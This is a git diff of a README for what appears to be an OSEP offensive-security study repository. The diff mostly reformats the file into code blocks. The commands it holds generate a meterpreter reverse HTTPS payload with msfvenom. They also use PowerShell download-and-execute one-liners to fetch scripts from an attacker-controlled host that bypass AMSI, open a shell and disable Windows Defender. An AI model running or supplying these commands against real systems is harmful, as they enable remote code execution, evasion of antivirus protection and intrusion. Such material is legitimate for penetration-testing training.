@@ -1,5 +1,4 @@
 # OSEP 
-
 this repository modified based on from `https://github.com/In3x0rabl3/OSEP`
 
 # Summary
@@ -19,17 +18,19 @@ Thank you, to everyone who's code was used in this repository.
 - [OSEP_MSSQL](https://github.com/In3x0rabl3/OSEP/tree/main/MSSQL)
 
 
-
-## OneKey Bypass Powershell And Get Shell
-- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f ps1
-- (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/Msfvenom_Bin/bypass_Ams1_getShell.ps1') | IEX;
-
+# OneKey Bypass Powershell And Get Shell
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f ps1
+(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/msfvenom_bin/bypass_Ams1_getShell.ps1') | IEX;
+```
 # OneKey Bypass Posershell AMSI
-- (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/Bypass_Defender/bypassAms1.ps1') | IEX;
-
+```
+(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/bypassAms1.ps1') | IEX;
+```
 
 # OneKey Disable Windows Defender
-- (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/Bypass_Defender/DefendersDeath.ps1') | IEX;
-- (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/Bypass_Defender/DisableDefender.ps1') | IEX;
-
+```
+(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DefendersDeath.ps1') | IEX;
+(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DisableDefender.ps1') | IEX;
 + (need administrator priviledge)
+```
